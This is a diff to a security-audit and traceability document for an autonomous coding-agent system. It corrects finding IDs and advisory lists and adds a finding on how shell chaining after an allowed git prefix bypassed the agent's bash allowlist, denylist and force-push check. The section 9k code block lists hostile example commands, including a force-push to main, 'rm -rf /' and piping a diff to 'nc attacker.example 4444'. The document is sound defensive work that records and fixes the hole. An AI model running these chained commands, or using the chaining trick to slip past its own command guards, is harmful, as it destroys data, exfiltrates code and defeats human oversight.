@@ -83,6 +83,7 @@ report's `P0-*` / `NEW-*` labels are the analysis names and these are the tracke
 | `ORPHAN-HIGH-457` | claim re-verification | HIGH | the explicit-append path was blind to the markdown store AND compared full id strings — the retrace's own collision, still reachable |
 | `ORPHAN-MEDIUM-458` | claim re-verification | MEDIUM | a YAML comment satisfied the sandbox-contract invariant, so the real verification step could be deleted unnoticed |
 | `ORPHAN-MEDIUM-459` | claim re-verification | MEDIUM | `apply_resource_limits` had zero production callers; a write-capable agent spawn was bounded by nothing |
+| `ORPHAN-CRITICAL-460` | fresh coverage lens | CRITICAL | a shell operator after an allowed prefix bypassed the allowlist, the denylist and the force-push check at once |
 
 Every ID above is listed here on purpose: this document is the `Closes:` target for all of them, and
 a trailer pointing at a file that does not name the finding is traceability theatre. Remaining
@@ -577,26 +578,40 @@ of those still yields `status: ok`, so `state_valid=true` and the damaged tree i
 canonical name with `overwrite: true`, destroying the last good copy.
 
 So the gate is a real improvement over the unconditional `if: always()` upload it replaced, and it is
-**not** the full guarantee the commit implied. Closing 348 means extending coverage to every declared
+**not** the full guarantee the commit implied. Closing `ORPHAN-HIGH-433` means extending coverage to every declared
 surface, which is the same work as P1-01.
 
 `ORPHAN-HIGH-434` also explains a data point visible from the start and not chased: the newest daily
 anchor tracked in git is `2026-05-08.md`.
 
-### Traceability correction for `f46324323`
+### Traceability correction for `2da9bf1f9`
 
-That commit's footer reads `Closes: …#ORPHAN-CRITICAL-427`. That is wrong on both counts and is
-corrected here rather than by rewriting history, since force-push is forbidden:
+**This correction was itself wrong twice, and is repaired here.** It was written against
+`f46324323` — a commit on the abandoned pre-retrace branch that is **not an ancestor of this
+branch** — so it named a SHA no reviewer of this PR can resolve, and it never named the commit that
+actually carries the defect. It also used bare old-numbering IDs (`342`/`343`) that the retrace had
+already remapped, so it read as being about two unrelated live findings. Both were found by an
+adversarial audit, not by me.
 
-* the commit's subject is the **343** work (the executable hard-fail registry); 342 was closed by
-  `873f038f8`, the preceding commit;
-* **343 is NOT closed.** Five of its 17 checks are bound to real implementations; twelve bind an
-  explicit failing `_not_implemented`, and the report is not threaded into
-  `pr_manager.open_pr_for_action` or `auto_merge.merge_if_green` yet.
+The commit on THIS branch is `2da9bf1f9`, and its footer reads
+`Closes: …#ORPHAN-CRITICAL-427`. That is wrong on both counts:
+
+* the commit's subject is the **`ORPHAN-CRITICAL-428`** work (the executable hard-fail registry);
+  `ORPHAN-CRITICAL-427` was closed by `05153e93d`, the preceding commit, whose trailer says so —
+  so `427` now has two closing trailers and `428` has none;
+* **`ORPHAN-CRITICAL-428` is NOT closed.** Five of its 17 checks are bound to real implementations;
+  twelve bind an explicit failing `_not_implemented`, and the report is not threaded into
+  `pr_manager.open_pr_for_action` or `auto_merge.merge_if_green`. An independent verifier later
+  confirmed the whole perimeter still has **zero non-test callers**.
+
+Corrected here rather than by rewriting history, because force-push is forbidden and the trailer is
+already pushed. The retrace re-authored every commit message and was in a position to fix this —
+that it reproduced a known-wrong trailer verbatim is the actual lesson, and it is recorded as such
+rather than presented as an unavoidable constraint.
 
 `ORPHAN-CRITICAL-428` stays `OPEN` — owner okan, deadline 2026-08-02 — until the twelve
 implementations and the two call sites land. Autonomous merge stays closed until then. Read
-`f46324323` as "partial progress on 343", never as a closure of anything.
+`2da9bf1f9` as "partial progress on `ORPHAN-CRITICAL-428`", never as a closure of anything.
 
 **Phase A update.** The five mechanical pre-PR-open checks now have real implementations, so all ten
 `pre_pr_open` entries are executable and the seven still bound to `_not_implemented` are exactly the
@@ -615,7 +630,7 @@ what the registry means:
   The check is implemented against the three commands that exist and the description corrected to
   match; the genuine platform gap is registered as `ORPHAN-MEDIUM-436` rather than dropped.
 
-`343` remains OPEN: the seven pre-merge checks and the two call sites
+`ORPHAN-CRITICAL-428` remains OPEN: the seven pre-merge checks and the two call sites
 (`pr_manager.open_pr_for_action`, `auto_merge.merge_if_green`) are phase B, stage S2.
 
 ### What the hunt did not cover
@@ -629,13 +644,15 @@ bypass-tested; prompt injection through repo content, finding text and PR bodies
 cost and resource exhaustion; crash recovery and idempotency; clock and artifact-expiry effects on
 cumulative counters. `auto_merge.py`, `merge_authority.py` and `pr_manager.py` were read only to
 prove a negative, so their own gating logic remains untested. One candidate — `runner_attestation.py`,
-a self-attested `sandbox_available` with no production caller, sitting directly on top of 342 — was
+a self-attested `sandbox_available` with no production caller, sitting directly on top of
+`ORPHAN-CRITICAL-427` — was
 found and not written up.
 
 The method gap worth fixing: the caller census was a one-level AST scan classifying test versus
 production by path. It did not resolve `python3 -m aria_kernel <subcommand>` strings inside workflow
 YAML, nor compute reachability from real entrypoints — a symbol with one production caller that is
-itself unreachable still counts as wired. The Tier-3 generalisation of 342/343/344 is a CI check that
+itself unreachable still counts as wired. The Tier-3 generalisation of
+`ORPHAN-CRITICAL-427`/`-428`/`ORPHAN-HIGH-429` is a CI check that
 diffs the gates *declared* in the plan and policy documents against the set actually reachable from
 an entrypoint.
 
@@ -779,8 +796,33 @@ dependency PR.
 
 `SUPPLY-HIGH-001` stays **OPEN**. Its registry row's notes were written when the override was
 believed to work and overstate what is achievable by that route; this section is the current
-account. Remaining after the revert: two root advisories — `brace-expansion` (with
-eslint/glob/minimatch/rimraf/gaxios/gcp-metadata transitive through it) and `typeorm`.
+account.
+
+**Correction — this section named the wrong advisory set, and it is the second time.** It said
+"two root advisories — `brace-expansion` and `typeorm`". An adversarial verifier re-ran the gate
+command and I reproduced it:
+
+```
+.github/workflows/ci-affected.yml:1019
+  npm audit --audit-level=high --omit=dev --json
+
+  moderate: 8    high: 4    critical: 0
+  high  brace-expansion   transitive
+  high  fast-uri          transitive
+  high  postcss           DIRECT
+  high  sharp             DIRECT
+```
+
+`typeorm`'s advisory is **moderate**, so it cannot turn a `--audit-level=high` gate red at all —
+naming it as a blocker was simply wrong. And three real blockers went unnamed, one of them `sharp`,
+which is the dependency this very section argues for reverting.
+
+The conclusion survives — the check stays red, it is pre-existing against a lockfile byte-identical
+to base, and it belongs in its own dependency PR — but the stated *cause* did not, and this section
+was itself the replacement for an earlier account that was also wrong. Two consecutive attempts at
+one paragraph, both confidently incorrect, both about numbers a single command prints. Recorded
+because it is the clearest instance in this document of the difference between reasoning about a
+system and measuring it.
 
 ## 9d. Why the same mistake happened three times (`ORPHAN-HIGH-441`)
 
@@ -1111,6 +1153,59 @@ caller (`ORPHAN-CRITICAL-428`, OPEN, S2); four trailer/body contradictions are `
 under the force-push ban and are recorded rather than papered over; and a set of documentation
 inaccuracies in this document and PLAN.md remain open — including §9c naming the wrong advisory set,
 seven surviving bare old-ID references, and two frozen registry rows citing abandoned IDs.
+
+## 9k. The claim set had almost no yield; the fresh lenses had all of it (`ORPHAN-CRITICAL-460`)
+
+The 45-claim re-verification came back **27 CONFIRMED / 6 ALREADY_FIXED / 6 PARTLY_TRUE / 1
+REFUTED**, and the number that matters is a different one: **zero survivors kept a CRITICAL or HIGH
+severity after independent re-rating**, and roughly two-thirds of what remained was documentation
+prose. Meanwhile the two fresh coverage lenses — reachability of every added control, and whether
+any added gate fails open on an input it does not recognise — produced **eighteen findings including
+two CRITICAL and five HIGH that the claim set never mentioned**.
+
+That is worth stating plainly, because it is a result about method rather than about ARIA: verifying
+a list of claims is bounded by the imagination of whoever wrote the list. The lenses were pointed at
+defect *classes* this branch had already demonstrated twice, and that is where everything serious
+was.
+
+**`ORPHAN-CRITICAL-460` — three layers defeated by one prefix.** `ALLOWED_BASH_COMMANDS` patterns are
+shaped `^git\s+status(\s+\S+)*\s*$`, and that trailing group matches anything — including `&&`.
+Every `DENIED_BASH_COMMANDS` pattern is `^`-anchored on argv-0, so the denylist only ever inspected
+the first binary and saw `git`. And `ORPHAN-HIGH-454`'s brand-new argv-token check reads
+`argv[:2] == ["git", "push"]`, which an allowed prefix blinds — so the fix landed hours earlier was
+walked past by typing five more characters.
+
+Reproduced at head before fixing. All of these were **ALLOWED**:
+
+```
+git status && git push origin main -f      ← force-push to main
+git status && rm -rf /
+git diff | nc attacker.example 4444        ← exfiltration
+git status $(curl http://x)
+git status > /tmp/exfil
+```
+
+…while every unchained equivalent was correctly refused, which is what proves chaining is the bypass
+rather than a gap in the lists.
+
+This one is **live, not latent.** Unlike the rest of the hard-fail perimeter — which
+`ORPHAN-CRITICAL-428` records as having no production caller at all — `verify_bash_command_allowed`
+has four: `tool_runner`, `tool_registry`, `verification_gate` and `fixture_runner`, and `tool_runner`
+feeds it argv straight from tool config.
+
+The fix is a precondition that runs before either list, because both lists reason about *a single
+command* and a chained argv is several. It tokenizes with `shlex(punctuation_chars=True)` rather than
+regex-scanning, because the distinction that matters is quoting: `git commit -m 'fix A && B'` carries
+`&&` as data and must still pass, while `git status && git push` carries it as an operator and must
+not. An argv that cannot be lexed fails closed. Eleven bypass spellings refused, nine ordinary
+commands still allowed, zero collateral.
+
+**Still open from the fresh lenses, and not fixed here:** the failure circuit breaker can never trip
+because `record_failure` has no producer (that is `ORPHAN-CRITICAL-420`, already OPEN); the
+`no_main_branch_write` gh-api guard is a five-entry denylist that the routes which actually write
+main all pass; and the hard-fail perimeter still has zero production callers
+(`ORPHAN-CRITICAL-428`). Those are recorded rather than rushed, because each is a real design change
+and this document's own lesson is that a fix written in a hurry is where the next finding comes from.
 
 ## 10. Limits of this verification
 
